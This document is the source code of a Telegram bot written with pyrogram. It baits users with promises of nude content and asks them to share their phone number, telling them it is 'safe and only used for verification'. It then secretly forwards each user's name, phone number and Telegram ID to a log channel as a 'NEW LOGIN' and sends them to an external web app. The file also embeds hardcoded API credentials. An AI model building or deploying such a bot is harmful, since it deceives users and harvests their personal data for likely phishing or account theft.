from pyrogram import Client, filters
from pyrogram.types import (
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo
)
import traceback
import os

api_id = 32208414
api_hash = "628f11c05a44c8dda4b006e66f4bf7df"
bot_token = "8972339795:AAFP8oSMJKav4aEeevCHZ9FnJsrVKJLw9ao"

LOG_CHANNEL = -1004376082945
WEB_APP_URL = "https://heroku-ne-808a61a8fe9e.herokuapp.com"

# Admin Panel URL - Change this to your admin panel URL
ADMIN_PANEL_URL = os.environ.get("ADMIN_PANEL_URL", "https://heroku-ne-808a61a8fe9e.herokuapp.com/admin")

# List of admin Telegram IDs - Add your admin IDs here
ADMIN_IDS = [8580367479, 8694029886]  # 👈 Apna Telegram ID yaha daalo

bot = Client(
    "edu_bot",
    api_id=api_id,
    api_hash=api_hash,
    bot_token=bot_token
)

def is_admin(user_id):
    """Check if user is admin"""
    return user_id in ADMIN_IDS

@bot.on_message(filters.command("start"))
async def start_handler(client, message):
    keyboard = ReplyKeyboardMarkup(
        [
            [
                KeyboardButton(
                    "📱 Share Phone Number",
                    request_contact=True
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=True
    )

    await message.reply_text(
        "👋 <b>Welcome to Nude Blur!</b>\n\n"
        "🔞 To access adult content, please share your phone number.\n\n"
        "🔒 Your number is safe and only used for verification.\n\n"
        "<b>📱 Tap the button below to share your contact.</b>",
        reply_markup=keyboard
    )

@bot.on_message(filters.command("admin"))
async def admin_handler(client, message):
    """Admin panel command - only for admins"""
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply_text(
            "⛔ <b>Access Denied!</b>\n\n"
            "You are not authorized to use this command.",
        )
        return
    
    # Admin keyboard with web app
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🔥 Open Admin Panel",
                    web_app=WebAppInfo(url=ADMIN_PANEL_URL)
                )
            ],
            [
                InlineKeyboardButton(
                    "📊 View Stats",
                    callback_data="admin_stats"
                ),
                InlineKeyboardButton(
                    "⚙️ Settings",
                    callback_data="admin_settings"
                )
            ]
        ]
    )
    
    await message.reply_text(
        f"🔥 <b>ADMIN PANEL</b>\n\n"
        f"👤 Welcome <b>{message.from_user.first_name}</b>!\n\n"
        f"📊 <b>Quick Actions:</b>\n"
        f"• Manage Ads\n"
        f"• View Statistics\n"
        f"• Control Bot Settings\n\n"
        f"⚡ Click the button below to open the admin panel:",
        reply_markup=keyboard
    )

@bot.on_message(filters.command("addadmin"))
async def add_admin_handler(client, message):
    """Add new admin - only for existing admins"""
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply_text("⛔ You are not authorized!")
        return
    
    # Get the user ID to add as admin
    try:
        new_admin_id = int(message.command[1])
        if new_admin_id not in ADMIN_IDS:
            ADMIN_IDS.append(new_admin_id)
            await message.reply_text(
                f"✅ <b>Admin Added!</b>\n\n"
                f"🆔 User ID: <code>{new_admin_id}</code>\n"
                f"👥 Total Admins: {len(ADMIN_IDS)}"
            )
        else:
            await message.reply_text("⚠️ User is already an admin!")
    except (IndexError, ValueError):
        await message.reply_text(
            "❌ <b>Usage:</b> <code>/addadmin USER_ID</code>\n\n"
            "Example: <code>/addadmin 123456789</code>"
        )

@bot.on_message(filters.command("removeadmin"))
async def remove_admin_handler(client, message):
    """Remove admin - only for existing admins"""
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply_text("⛔ You are not authorized!")
        return
    
    try:
        remove_id = int(message.command[1])
        if remove_id in ADMIN_IDS:
            ADMIN_IDS.remove(remove_id)
            await message.reply_text(
                f"✅ <b>Admin Removed!</b>\n\n"
                f"🆔 User ID: <code>{remove_id}</code>"
            )
        else:
            await message.reply_text("⚠️ User is not an admin!")
    except (IndexError, ValueError):
        await message.reply_text(
            "❌ <b>Usage:</b> <code>/removeadmin USER_ID</code>"
        )

@bot.on_message(filters.command("admins"))
async def list_admins_handler(client, message):
    """List all admins"""
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply_text("⛔ You are not authorized!")
        return
    
    admins_text = "👥 <b>ADMIN LIST</b>\n\n"
    for idx, admin_id in enumerate(ADMIN_IDS, 1):
        try:
            user = await client.get_users(admin_id)
            name = user.first_name or "Unknown"
            username = f"@{user.username}" if user.username else "No username"
            admins_text += f"{idx}. <b>{name}</b>\n   ├ ID: <code>{admin_id}</code>\n   └ {username}\n\n"
        except:
            admins_text += f"{idx}. <b>Unknown User</b>\n   └ ID: <code>{admin_id}</code>\n\n"
    
    await message.reply_text(admins_text)

@bot.on_message(filters.contact)
async def contact_handler(client, message):
    try:
        contact = message.contact
        user = message.from_user

        if contact.user_id is not None and contact.user_id != user.id:
            await message.reply_text(
                "❌ Please use the button to share your own phone number."
            )
            return

        name = user.first_name or "Unknown"
        phone = contact.phone_number
        user_id = user.id

        # Send log to channel
        try:
            await client.send_message(
                LOG_CHANNEL,
                f"🎓 <b>NEW LOGIN</b>\n\n"
                f"👤 Name: {name}\n"
                f"📱 Phone: +{phone}\n"
                f"🆔 TG ID: <code>{user_id}</code>"
            )
            print(f"✅ Log sent to channel for user {user_id}")
        except Exception as log_error:
            print(f"❌ Failed to send log: {log_error}")

        # Web App button
        keyboard = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🔥 Get Nudes Now",
                        web_app=WebAppInfo(url=WEB_APP_URL)
                    )
                ]
            ]
        )

        await message.reply_text(
            "📱 <b>Phone number received!</b>\n\n"
            "🔞 Click the button below to access adult content.\n\n"
            "<b>⚠️ 18+ Content</b> - You must be 18 years or older.",
            reply_markup=keyboard
        )

    except Exception as e:
        error_msg = f"Error: {str(e)}\n\n{traceback.format_exc()}"
        print(error_msg)
        await message.reply_text(
            f"❌ Error: {str(e)}\n\nPlease try again or contact support."
        )

@bot.on_callback_query()
async def callback_handler(client, callback_query):
    """Handle callback queries"""
    data = callback_query.data
    user_id = callback_query.from_user.id
    
    if not is_admin(user_id):
        await callback_query.answer("⛔ Not authorized!", show_alert=True)
        return
    
    if data == "admin_stats":
        # Show quick stats
        await callback_query.answer("📊 Loading stats...", show_alert=False)
        await callback_query.message.reply_text(
            "📊 <b>Quick Stats</b>\n\n"
            "Use the Admin Panel for detailed statistics.",
        )
    
    elif data == "admin_settings":
        await callback_query.answer("⚙️ Opening settings...", show_alert=False)
        await callback_query.message.reply_text(
            "⚙️ <b>Settings</b>\n\n"
            "Open the Admin Panel to change settings.",
        )

if __name__ == "__main__":
    print("🚀 Sex Bot Started...")
    print(f"📢 Log Channel: {LOG_CHANNEL}")
    print(f"🔥 Admin Panel: {ADMIN_PANEL_URL}")
    print(f"👥 Admins: {len(ADMIN_IDS)}")
    bot.run()
